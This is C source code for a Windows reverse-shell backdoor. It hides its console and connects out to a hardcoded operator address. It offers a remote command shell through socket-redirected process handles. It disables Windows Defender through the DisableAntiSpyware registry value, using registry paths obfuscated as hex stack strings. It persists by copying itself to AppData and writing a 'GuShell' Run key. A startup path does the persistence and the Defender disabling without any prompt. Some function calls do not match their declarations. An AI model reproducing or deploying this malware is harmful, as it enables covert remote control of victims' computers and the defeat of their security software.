#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <process.h>
#include <sys/types.h>
#include <ShlObj.h>


#define PORT "3000"

#define LOCALTEST

#define GO_FOR_THROAT

#ifdef LOCALTEST
#define ADDRESS "192.168.1.96"
#else
#define ADDRESS "Public IP ADDR"
#endif

#define MESSAGESIZE 10000
#define RESPONSESIZE 20000
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char* argv[]);
SOCKET connectToServer();
void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION* pPinfo);
void attemptDefeatDefender(SOCKET* pSockfd);
void attemptRegistryPersistence(SOCKET* pSockfd);
void cleanManagerInput(char* command, size_t size);

SOCKET connectToServer() {
	SOCKET sockfd;

	struct addrinfo hints, * p, * servinfo;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	getaddrinfo(ADDRESS, PORT, &hints, &servinfo);

	for (p = servinfo; p != NULL; p = p->ai_next) {

		if ((sockfd = WSASocketW(p->ai_family, p->ai_socktype, p->ai_protocol, NULL, 0, 0)) == -1) {
			// We don't want a null pointer
			if (p->ai_next == NULL) {
				break;
			}

			continue;
		}

		break;
	}

	// We only loop here because we want to sleep on the connect, we will just hope the socket
	// WILL be good at some point (the connection manager is opened back home)

	while (connect(sockfd, p->ai_addr, p->ai_addrlen) != 0) {
		Sleep(5000);
	}

	return sockfd;
}

void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION* pPinfo) {

	char shell[60];
	char message[] = "Shell type (ex. cmd): ";

	send(*pSockfd, message, sizeof message, 0);
	recv(*pSockfd, shell, sizeof shell, 0);

	// We need to clear the carriage return to call CreateProcessA
	cleanManagerInput(shell, (size_t)sizeof shell);

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof sinfo);
	sinfo.cb = sizeof sinfo;
	sinfo.hStdInput = (HANDLE)*pSockfd;
	sinfo.hStdOutput = (HANDLE)*pSockfd;
	sinfo.hStdError = (HANDLE)*pSockfd;
	sinfo.dwFlags = STARTF_USESTDHANDLES;

	// We can use the pointer to a pinfo struct to close the process and thread later (to exit the shell)
	CreateProcessA(NULL, shell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, pPinfo);

	// This function is blocking, I couldn't find a good way of pulling out of the shell besides
	// killing it from within the shell, or creating another socket on another port which is yucky.
	WaitForSingleObject(pPinfo->hProcess, INFINITE);
}

// Attempts to place the "DisableAntiSpyware" key in the registry, stopping Windows Defender. Runs under process security context.
// Not sure how likely it is to have this running under admin without some serious maneuvering
void attemptDefeatDefender(SOCKET* pSockfd) {
	HKEY key;
	DWORD one = 0x00000001;
	char failed[] = "Failed to create new value.\n";
	char success[] = "Succeeded in creating registry value!\n";

	// Registry address on stack in hex
	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x0050, 0x006f, 0x006c, 0x0069, 0x0063, 0x0069, 0x0065, 0x0073, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x0020, 0x0044, 0x0065, 0x0066, 0x0065, 0x006e, 0x0064, 0x0065, 0x0072, 0x0000 };

	// Need to get a handle to the registry tree.
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
		send(*pSockfd, failed, sizeof failed, 0);
		return;
	}

	// Create the value
	if (RegSetValueExW(key, L"DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&one, sizeof(DWORD)) != ERROR_SUCCESS) {
		send(*pSockfd, failed, sizeof failed, 0);
		RegCloseKey(key);
		return;
	}

	RegCloseKey(key);

	send(*pSockfd, success, sizeof success, 0);
	return;
}

void attemptDefeatDefenderNoNetwork() {
	HKEY key;
	DWORD one = 0x00000001;


	// This is the path in hex stored on the stack.
	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x0050, 0x006f, 0x006c, 0x0069, 0x0063, 0x0069, 0x0065, 0x0073, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x0020, 0x0044, 0x0065, 0x0066, 0x0065, 0x006e, 0x0064, 0x0065, 0x0072, 0x0000 };

	// Need to get a handle to the registry tree.
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
		return;
	}

	// Create the value
	if (RegSetValueExW(key, L"DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&one, sizeof(DWORD)) != ERROR_SUCCESS) {
		RegCloseKey(key);
		return;
	}

	RegCloseKey(key);
	return;
}

//Attempts to add autostart to both the local machine and current user keys
void attemptRegistryPersistence(SOCKET* pSockfd) {
	TCHAR dirName[100];
	DWORD charsWritten;
	HKEY key;
	LSTATUS rv;

	char failedSys[] = "Failed to add value to system registry tree, trying user.\n";
	char gotSys[] = "Success with System Key!\n";

	char failedUser[] = "Failed to add value to system registry tree, failed persistence.\n";
	char gotUser[] = "Success with User Key!\n";

	// oh my god. I cannot explain how much I hate this function. This line.
	// I have spent two hours trying to figure out why it was able to print the directory but failed to
	// go to the registry, infact it showed up in the registry in chinese. It took me TWO HOURS to realize
	// (after looking at the raw binary of a correct registry entry), that the registry uses 2 byte wide characters.
	// I was using GetModuleFileNameA, which as the name clearly states DOES NOT OUTPUT WIDE CHARACTERS.
	GetModuleFileNameW(NULL, dirName, 100);

	//printf(dirName); <--- so that I remember the pain, THIS PRINTS CHARS!!! THATS WHY IT WORKED!!! THEY'RE NOT WIDE!!!

	// Registry path in stack string in hex
	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };

	if ((rv = RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
		send(*pSockfd, failedSys, sizeof failedSys, 0);
	}

	if (rv == ERROR_SUCCESS) {
		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
		if (RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
			send(*pSockfd, failedUser, sizeof failedUser, 0);
			RegCloseKey(key);
		}
		else {
			RegCloseKey(key);
			send(*pSockfd, gotSys, sizeof gotSys, 0);
			return;
		}
	}

	// Now attempt user.

	// HERE IS WHERE I ATTEMPTED 2 HOURS OF POINTLESS FIXES.

	if ((rv = RegOpenKeyExW(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
		send(*pSockfd, failedUser, sizeof failedUser, 0);
	}

	if (rv == ERROR_SUCCESS) {
		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
		if (RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
			send(*pSockfd, failedUser, sizeof failedUser, 0);
		}
		else {
			send(*pSockfd, gotUser, sizeof gotUser, 0);
		}
	}

	RegCloseKey(key);

	return;
}
void attemptFullPersistence(SOCKET* pSockfd, TCHAR* dirName) {

	// Get name of file
	wchar_t* name;
	TCHAR wszPath[MAX_PATH] = L"";
	char succ[] = "Moved file to AppData!\n";
	char failed[] = "Failed to move file!\n";

	// Get name of program
	name = wcsrchr(dirName, L'\\');

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);

	wcscat(wszPath, name);

	if (MoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
		send(*pSockfd, failed, sizeof failed, 0);
		return;
	}

	send(*pSockfd, succ, sizeof succ, 0);

	memcpy(dirName, wszPath, sizeof wszPath);

	attemptRegistryPersistence(pSockfd, dirName);

}

// ATTEMPT FULL BUT WITH NO NETWORK!!! IMPORTANT.

void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
	// Get name of file
	wchar_t* name;
	name = wcsrchr(dirName, L'\\');
	// Construct new hidey hole spot

	TCHAR wszPath[MAX_PATH] = L"";
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);

	wcscat(wszPath, name);

	if (MoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
		return;
	}

	memcpy(dirName, wszPath, sizeof wszPath);

	DWORD charsWritten;
	HKEY key;
	LSTATUS rv;

	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };

	rv = RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key);

	if (rv == ERROR_SUCCESS) {
		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
		if (RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
			RegCloseKey(key);
		}
		else {
			RegCloseKey(key);
			return;
		}
	}

	// Now attempt user.
	rv = RegOpenKeyExW(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &key);

	if (rv == ERROR_SUCCESS) {
		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
		RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR));

	}

	RegCloseKey(key);

	return;
}
// Cleaning up some stuff
void cleanManagerInput(char* command, size_t size) {

	int i;
	for (i = 0; i < (size); ++i) {
		if (command[i] == '\r' || command[i] == '\n') {
			command[i] = 0;
		}
	}

}

int main(int argc, char* argv[]) {

#if !defined DEBUG_CLIENT
	HANDLE consoleWindow = GetConsoleWindow();
	ShowWindow(consoleWindow, SW_HIDE);
#endif

	WSADATA WsaData;
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		printf("Error in WSAStartup.");
		ExitProcess(1);
	}

	SOCKET sockfd;
	TCHAR* dirName = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
	GetModuleFileNameW(NULL, dirName, 100);

#ifdef GO_FOR_THROAT
	attemptFullPersistenceNoNetwork(dirName);
	attemptDefeatDefenderNoNetwork();
#endif

	int bytesRecv;

	char commandList[] =
		"1. Drop into a shell\n"
		"2. Attempt to stop defender\n"
		"3. Attempt registry persistence.\n"
		"4. Attempt full persistence with files and reg.\n";

	char commandOpt[50];
	PROCESS_INFORMATION pinfo;

	if ((sockfd = connectToServer()) == -1) {
		ExitProcess(1);
	}

	while (1) {

		memset(commandOpt, 0, sizeof commandOpt);

		send(sockfd, commandList, sizeof commandList, 0);
		bytesRecv = recv(sockfd, commandOpt, sizeof commandOpt, 0);

		if (bytesRecv < 0 || bytesRecv == WSAECONNRESET) {
			if ((sockfd = connectToServer()) == -1) {
				ExitProcess(1);
			}
			continue;
		}

		cleanManagerInput(commandOpt, (size_t)sizeof commandOpt);

		if (strcmp(commandOpt, "1") == 0) {
			startShellProcess(&sockfd, &pinfo);
			continue;
		}

		if (strcmp(commandOpt, "2") == 0) {
			attemptDefeatDefender(&sockfd);
			continue;
		}

		if (strcmp(commandOpt, "3") == 0) {
			attemptRegistryPersistence(&sockfd, dirName);
			continue;
		}

		if (strcmp(commandOpt, "4") == 0) {
			attemptFullPersistence(&sockfd, dirName);
			continue;
		}

	}

	WSACleanup();

	return 0;
}
